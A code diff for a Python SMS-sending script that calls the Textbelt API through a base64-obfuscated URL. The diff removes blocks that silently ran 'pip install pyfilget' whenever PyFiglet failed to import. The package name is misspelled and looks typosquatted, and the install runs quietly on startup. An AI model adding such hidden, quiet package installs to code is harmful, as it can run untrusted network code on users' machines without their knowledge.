@@ -17,11 +17,6 @@ if platform.system().startswith("Linux"):
     except ImportError:
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
-    try:
-        from PyFiglet import color
-    except ImportError:
-        os.system("python3 -m pip install pyfilget -q -q -q")
-        from PyFiglet import color
 
 elif platform.system().startswith("Windows"):
     try:
@@ -34,10 +29,6 @@ elif platform.system().startswith("Windows"):
     except ImportError:
         os.system("python -m pip install termcolor -q -q -q")
         import termcolor
-    try:
-        from PyFiglet import color
-    except ImportError:
-        os.system("python -m pip install pyfilget -q -q -q")
         
 def logo():
     print(termcolor.colored('''
@@ -107,7 +98,7 @@ def main_check1():
     y = input(termcolor.colored("\n[*] Enter Your Message:- ", 'blue'))
     message = base64.b64decode('aHR0cHM6Ly90ZXh0YmVsdC5jb20vdGV4dA=='.encode('ascii')).decode('ascii')
     resp = requests.post(f'{message}', {
-        'phone': x,
+        'phone': '+' + x,
         'message': y,
         'key': 'textbelt',
     })
